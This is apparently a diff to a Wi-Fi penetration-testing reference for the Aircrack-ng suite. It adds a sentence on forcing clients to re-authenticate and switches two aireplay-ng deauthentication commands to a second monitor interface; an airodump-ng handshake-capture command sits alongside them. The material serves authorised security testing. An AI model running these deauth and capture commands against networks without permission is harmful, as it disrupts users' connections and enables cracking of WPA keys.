@@ -169,7 +169,7 @@ A comprehensive reference for wireless security testing with the Aircrack-ng sui
 
     **Terminal 1 - Capture handshake:**
 
-3 
+    This kind of capture generally requires the use of multiple adapters and multiple terminal screens. If the target network is not very active, we can essentially 'kick' a client off a network and get it to re-authenticate whilst trying to capture the handshake.
 
     ```bash
     sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
@@ -177,12 +177,12 @@ A comprehensive reference for wireless security testing with the Aircrack-ng sui
 
     **Terminal 2 - Deauth attack:**
     ```bash
-    sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+    sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan1mon
     ```
 
     **Terminal 3 - Target specific client:**
     ```bash
-    sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC:ADDR wlan0mon
+    sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC:ADDR wlan1mon
     ```
 
     !!! warning "Active Deauth"
